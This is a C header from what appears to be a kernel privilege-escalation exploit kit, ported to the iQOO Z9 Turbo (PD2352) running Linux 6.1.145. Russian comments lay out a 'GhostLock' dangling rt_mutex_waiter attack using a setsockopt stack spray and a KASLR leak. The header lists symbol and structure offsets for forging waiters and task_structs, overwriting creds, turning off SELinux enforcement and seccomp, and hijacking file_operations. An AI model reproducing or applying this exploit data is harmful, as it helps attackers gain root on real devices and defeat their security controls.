#ifndef OFFSET_H
#define OFFSET_H

/* RMV port (PD2352 / iQOO Z9 Turbo CN, kernel 6.1.145-android14-11-maybe-dirty,
 * прошивка 16.2.17.0.W10). Символы — kallsyms из boot.img официального OTA
 * 16.2.17.0 (sha256 образа — в каталоге payloads). Структурные оффсеты —
 * BTF семейства android14-6.1 (совпадают с I2407/kit offsets.json побайтно).
 *
 * ТРАНСПОРТ: MCAST. Стек pselect на этом теле геометрически НЕ покрывает
 * висячий rt_mutex_waiter (нужные слова waiter'а лежат за окном fd_set:
 * -19/-5) — классический pselect-маршрут здесь мёртв. Вместо него
 * setsockopt(SOL_IP, MCAST_JOIN_SOURCE_GROUP, buf, 0x108) на TCP AF_INET
 * сокете: do_ip_setsockopt делает memset+copy_from_sockptr 0x108 в кадр
 * sp+0x18. Геометрия (тот же входной SP, модель E):
 *   waiter = E-0x2D8 (sys_futex 0x70,cp_do_futex 0xD0,frame 0x1C0, +0x28);
 *   цепочка setsockopt = 0x10+0x60+0x10+0x10+0x40, кадр do_ip_setsockopt
 *   0x280 (stp 0x50 + sub 0x230) => buf = E-0x338 => waiter = buf + 0x60.
 * Буфер полностью накрывает waiter [0x60,0xB8) — GhostLock ЖИВ через MCAST.
 *
 * СТАТУС: ЭКСПЕРИМЕНТАЛЬНЫЙ. Ни slide, ни root-стадия на этом теле на
 * устройстве не проверялись. Panics возможны (гонка переиспользования
 * кадра, как в ghostlock-kit 25-30% попаданий). Каталог: status=experimental.
 */

#define WAITER_COMPACT 1
#define WAITER_WORD_SHIFT 0

/* Смещенного wait'ера начало внутри MCAST-буфера (байт). */
#define MCAST_WAITER_OFF 0x60ULL

#define BUILD_VARIANT_LABEL "pd2352-z9t-6.1.145-mcast"
#define BUILD_FINGERPRINT "iQOO/PD2352/V2352A (kernel 6.1.145-android14-11-maybe-dirty, 16.2.17.0.W10)"

/* KernelSnitch: sizeof(mm_struct) = 0x400 на android14-6.1
 * (kit offsets.json 6.1.145, device-verified; было 0x500 от 6.6 —
 * из-за этого mm_struct leak миссовал на каждой попытке). */
#define MM_STRUCT_SZ 0x400

/* ---- Memory layout ---- */
#define KIMAGE_TEXT_BASE             0xffffffc008000000ULL
#define P0_PAGE_OFFSET               0xffffff8000000000ULL
#define P0_PHYS_OFFSET               0x80000000ULL
#define P0_KERNEL_PHYS_LOAD          0xa8000000ULL
#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
#define DIRECT_MAP_BASE              0xffffff8000000000ULL
#define DIRECT_MAP_END               0xffffff9000000000ULL
#define VMEMMAP_START                0xfffffffe00000000ULL

/* ---- Core kernel symbols (image-relative, kallsyms boot.img 16.2.17.0) ---- */
/* В этом ядре нет отдельного символа ashmem_misc (статик вырезан из
 * kallsyms). ASHMEM_MISC_FOPS = адрес ashmem_fops: корневая стадия с
 * hijack misc-fops на этом теле НЕ валидирована — если slide даст KASLR,
 * а CFI-ворота не пройдут, нужен подбор другого fops-слота на устройстве. */
#define ASHMEM_MISC_FOPS_OFF 0x013434b0ULL
#define ASHMEM_FOPS_OFF 0x013434b0ULL
#define ASHMEM_IOCTL_OFF 0x00cc7f48ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00cc8884ULL
#define ASHMEM_MMAP_OFF 0x00cc88dcULL
#define ASHMEM_OPEN_OFF 0x00cc8b00ULL
#define ASHMEM_RELEASE_OFF 0x00cc8ba0ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00cc8c28ULL
#define CONFIGFS_READ_ITER_OFF 0x004df490ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x004df9c0ULL
#define COPY_SPLICE_READ_OFF 0x0045fb60ULL
#define NOOP_LLSEEK_OFF 0x004120ccULL
#define INIT_TASK_OFF 0x021dfc00ULL
#define ROOT_TASK_GROUP_OFF 0x02422740ULL
#define INIT_CRED_OFF 0x021f24f0ULL
#define SELINUX_BLOB_SIZES_OFF 0x016f0458ULL
/* selinux_state.enforcing: enforcing bool@0 (CONFIG_SECURITY_SELINUX_DEVELOP). */
#define SELINUX_ENFORCING_OFF 0x025586a8ULL
#define SECURITY_HOOK_HEADS_OFF 0x016efd48ULL
#define KMALLOC_CACHES_OFF 0x016ef888ULL
#define ANON_PIPE_BUF_OPS_OFF 0x011bb7d0ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ---- SLIDE (KASLR leak) targets ---- */
#define SLIDE_NFULNL_LOGGER_OFF 0x021d2f98ULL
#define SLIDE_LOGGERS_0_1_OFF 0x021d2ee8ULL  /* = LOGGER - 0xB0 */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02579cc8ULL  /* sysctl_bootid */
#define SLIDE_NFULNL_LOG_PACKET_OFF 0x00ebc0e8ULL
#define SLIDE_BOOTID_LEAK_SOURCE_OFF     (SLIDE_NFULNL_LOGGER_OFF + 0x10ULL)
#define SLIDE_BOOTID_LEAK_VALUE_OFF      SLIDE_NFULNL_LOG_PACKET_OFF
#define SLIDE_PROC_DO_UUID_OFF 0x008e6eecULL
#define SLIDE_INIT_TASK_OFF 0x021dfc00ULL
#define SLIDE_ROOT_TASK_GROUP_OFF 0x02422740ULL
#define SLIDE_SYSCTL_BOOTID_OFF 0x02579cc8ULL

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---- Layout внутри kernel page ---- */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* ---- rt_mutex_waiter (android14-6.1 compact, BTF/kit) ---- */
#define WAITER_LOCAL_OFF 0x80ULL
#define WAITER_TREE_ENTRY_OFF 0x0ULL
#define WAITER_PI_TREE_ENTRY_OFF 0x18ULL
#define WAITER_TASK_OFF 0x30ULL
#define WAITER_LOCK_OFF 0x38ULL
#define WAITER_WAKE_STATE_OFF 0x40ULL
#define WAITER_PRIO_OFF 0x44ULL
#define WAITER_DEADLINE_OFF 0x48ULL
#define WAITER_WW_CTX_OFF 0x50ULL

/* Forged waiter (компактная форма 6.1) */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x44
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_WW_CTX_OFF 0x50

/* ---- Fake task_struct fields (BTF 6.1) ---- */
#define FAKE_TASK_USAGE_OFF 0x40ULL
#define FAKE_TASK_PRIO_OFF 0x84ULL
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8cULL
#define FAKE_TASK_TASK_GROUP_OFF       0x348ULL
#define FAKE_TASK_PI_LOCK_OFF 0x924ULL
#define FAKE_TASK_PI_WAITERS_OFF 0x938ULL
#define FAKE_TASK_PI_TOP_TASK_OFF 0x948ULL
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950ULL
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350ULL
#define FAKE_TASK_UCLAMP_OFF 0x358ULL

/* ---- configfs buffer (CFG) offsets ---- */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* ---- task_struct field offsets (BTF 6.1) ---- */
#define MM_OWNER_OFF 0x298ULL
#define TASK_PID_OFF                   0x630ULL
#define TASK_TGID_OFF                  0x634ULL
#define TASK_REAL_PARENT_OFF 0x688ULL
#define TASK_ATOMIC_FLAGS_OFF          0x5f0ULL
#define TASK_REAL_CRED_OFF 0x830ULL
#define TASK_CRED_OFF 0x838ULL
#define TASK_COMM_OFF 0x848ULL
#define TASK_TASKS_OFF                 0x550ULL
#define TASK_THREAD_INFO_FLAGS_OFF 0x0ULL
#define TASK_SECCOMP_OFF               0x900ULL

/* vr.ko anti-root: на PD2352 модуль/символы не верифицированы —
 * root.c сам выключает VR-стадию через #ifdef VR_TAG_A_OFF. */

/* ---- cred structure offsets (BTF) ---- */
#define CRED_UID_OFF                   0x4ULL
#define CRED_SECUREBITS_OFF            0x24ULL
#define CRED_CAPS_OFF                  0x28ULL
#define CRED_SECURITY_OFF              0x78ULL
#define SELINUX_CRED_BLOB_OFF 0x0ULL
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4

/* ---- seccomp offsets ---- */
#define SECCOMP_MODE_OFF 0x0ULL
#define SECCOMP_FILTER_COUNT_OFF 0x4ULL
#define SECCOMP_FILTER_OFF 0x8ULL
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* ---- struct page / slab offsets ---- */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

/* ---- pipe_buffer offsets ---- */
#define PIPE_BUFFER_SIZE      0x28
#define PIPE_BUFFER_SLOTS     32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ---- struct file_operations slot offsets ---- */
#define FOPS_OWNER_OFF 0x0
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif /* OFFSET_H */
